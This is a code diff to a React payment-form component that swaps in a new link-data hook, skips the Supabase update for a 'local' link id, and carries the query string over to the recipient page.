@@ -4,7 +4,8 @@ import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { useLink, useUpdateLink } from "@/hooks/useSupabase";
+import { useUpdateLink } from "@/hooks/useSupabase";
+import { useLinkData } from "@/hooks/useLinkData";
 import {
   FileText,
   Loader2,
@@ -26,7 +27,7 @@ const PaymentData = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: link, isLoading } = useLink(id);
+  const { data: link, isLoading } = useLinkData(id);
   const updateLink = useUpdateLink();
 
   const [reference, setReference] = useState("");
@@ -51,12 +52,14 @@ const PaymentData = () => {
 
     setIsSubmitting(true);
     try {
-      await updateLink.mutateAsync({
-        linkId: id!,
-        payload: { ...link?.payload, reference, nationalId }
-      });
+      if (id && id !== 'local') {
+        await updateLink.mutateAsync({
+          linkId: id!,
+          payload: { ...link?.payload, reference, nationalId }
+        });
+      }
 
-      navigate(`/pay/${id}/recipient`);
+      navigate(`/pay/${id}/recipient${window.location.search}`);
     } catch (err) {
       console.error(err);
     } finally {
